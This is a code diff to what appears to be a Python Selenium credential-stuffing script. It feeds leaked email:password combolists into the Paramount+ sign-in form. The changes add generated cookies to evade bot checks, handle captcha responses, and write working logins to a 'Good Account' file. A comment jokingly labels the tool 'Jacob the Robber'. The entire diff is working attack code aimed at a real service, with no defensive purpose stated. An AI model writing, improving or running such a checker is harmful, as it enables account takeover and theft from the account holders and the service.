@@ -1,6 +1,7 @@
 import time
 import os
 
+from modules.save_cookies import GenerateCookies
 from combo_splitters.split_combos import ComboSplitter
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -14,7 +15,7 @@ from pathlib import Path
 
 def paramount_():
 	title()
-	file_directory = str(Path(__file__).parents[1])+'/combolists/combos/paramount'
+	file_directory = str(Path(__file__).parents[1])+'/combolists/paramount'
 	plain_directory = str(Path(__file__).parents[1])
 	ip_country()
 	page = 'https://www.paramountplus.com/account/signin/'
@@ -33,24 +34,23 @@ def paramount_():
 		with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
 			try:
 				print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
+				grab_cookies = GenerateCookies(page, plain_directory, 'paramount')
+				grab_cookies.create_headers()
+				cookies_dict = grab_cookies.create_cookies()
 				browser = webdriver.Chrome(options=browser_options)
 				browser.set_window_size(500, 700)
 				browser.get(page)
-				cookies = browser.get_cookies()
-				print(cookies)
-				exit()
+				time.sleep(5)
 				# a6121399-6ef9-447e-8653-8e223168a398 💀 Jacob the Robber!
-				# 9f064779-4c06-49f1-9cdd-7e64e653145e
-				# bb7470a9-4e85-4863-b551-8667ea62be6c
-				browser.add_cookie({'name': 'ovvuid', 'value': 'a6121399-6ef9-447e-8653-8e223168a398'})
-				browser.set_page_load_timeout(10)
+				for (k, v) in cookies_dict.items():
+					browser.add_cookie({'name': k, 'value': v})
 				email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
 				password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
 				sign_in_button = browser.find_element(By.XPATH, '//*[@id="sign-in-form"]/div/div[3]/button')
 				email_input_box.send_keys(users[index])
 				password_input_box.send_keys(passwords[index])
 				sign_in_button.click()
-				time.sleep(5)
+				time.sleep(4)
 				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
 					print(' -- Error: Captcha. Iteration index not increased'.format(users[index], passwords[index]))
 					continue
@@ -60,14 +60,10 @@ def paramount_():
 						print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
 						index +=1
 						continue
-				if 'signin/' in str(browser.current_url):
-					print(' -- {}:{} ---> Request Processing Error'.format(users[index],passwords[index]))
 				if 'home' in str(browser.current_url):
 					print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
 					account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
-				if browser.find_elements(By.XPATH, '//*[@id="profile-container"]/div/div/div[1]/div[3]'):
-					valid = browser.find_element(By.XPATH, '//*[@id="profile-container"]/div/div/div[1]/div[3]').text
-					if "Who's Watching" in str(valid):
+				if 'user-profile/whos-watching' in browser.current_url:
 						print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
 						account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
 				browser.close()
